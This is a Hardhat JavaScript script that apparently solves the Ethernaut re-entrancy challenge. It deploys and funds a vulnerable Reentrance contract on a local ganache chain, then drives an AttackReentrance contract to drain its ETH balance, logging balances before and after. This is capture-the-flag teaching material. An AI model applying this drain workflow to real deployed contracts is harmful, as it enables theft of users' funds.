/*
The goal of this level is for you to steal all the funds from the contract.

  Things that might help:

Untrusted contracts can execute code where you least expect it.
Fallback methods
Throw/revert bubbling
Sometimes the best way to attack a contract is with another contract.
*/

const hre = require("hardhat");
const path = require("path");
require('dotenv').config( {
  path: path.join(__dirname, '.env')
} );

PRIVATE_KEY=process.env.PRIVATE_KEY;
GAS_LIMIT=process.env.GAS_LIMIT;

async function main() {
  // Recreating the attack on ganache
  [macias, deployer] = await ethers.getSigners();

  const Reentrance = await hre.ethers.getContractFactory("Reentrance");
  this.reentrance = await Reentrance.connect(deployer).deploy();
  await this.reentrance.deployed();

  // funding the Reentrance contract
  // Signing and Sending the tx
  const wallet = new hre.ethers.Wallet(PRIVATE_KEY);

  gasPrice = await hre.ethers.provider.getGasPrice()
  nonce = await hre.ethers.provider.getTransactionCount(wallet.address);

  let fundReentranceTx = {
    nonce: nonce,
    to: this.reentrance.address,
    value: hre.ethers.utils.parseEther("0.001"),
    gasLimit: parseInt(GAS_LIMIT),
    gasPrice: gasPrice
  };

  let signedTX = await wallet.signTransaction(fundReentranceTx);
  const sentFundReentranceTx = await hre.ethers.provider.sendTransaction(signedTX);
  //console.log("sentFundReentranceTx: ", sentFundReentranceTx);
  
  let fundReentranceTxResult = await hre.ethers.provider.waitForTransaction(sentFundReentranceTx.hash);
  //console.log("fundReentranceTxResult Result: ", fundReentranceTxResult);

  // Deploying the AttackerReentrance contract
  const AttackReentrance = await hre.ethers.getContractFactory("AttackReentrance");
  this.attackReentrance = await AttackReentrance.connect(macias).deploy(this.reentrance.address);
  await this.attackReentrance.deployed();

  console.log(
    `
    Reentrance contract ETH Balance ${await hre.ethers.provider.getBalance(this.reentrance.address)} \n
    ReentranceAttack contract will attack the next contract: ${await this.attackReentrance.reentranceContract()} \n
    ReentranceAttack contract ETH Balance: ${await hre.ethers.provider.getBalance(this.attackReentrance.address)}
    `
  );

  console.log("\n\n Performing attack ... \n\n");

  const currentReentranceETHBalance = await hre.ethers.provider.getBalance(this.reentrance.address); // The returned value is already expressed in wei
  const attackAmount = currentReentranceETHBalance;

  console.log("currentReentranceETHBalance: ", hre.ethers.utils.formatEther(currentReentranceETHBalance));
  console.log("attackAmount: ", hre.ethers.utils.formatEther(attackAmount));

  // Draining the ETH balance of the Reentrance contract
  console.log("Draining the ETH balance of the Reentrance contract ...");

  const tx = await this.attackReentrance.connect(macias).attack({ value: attackAmount });
  
  // Await for the tx to be mined
  console.log("Waiting while the Reentrance conctract is paying the price of not been audited! : )");
  let txResult = await tx.wait();

  //console.log("transaction " , txResult);

  console.log("===============================================\n===============================================\n");
  console.log("\n\n Results after performing the attack \n\n");

  console.log(
    `
    Reentrance contract ETH Balance ${await hre.ethers.provider.getBalance(this.reentrance.address)} \n
    ReentranceAttack contract ETH Balance: ${await hre.ethers.provider.getBalance(this.attackReentrance.address)}
    `
  );

  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});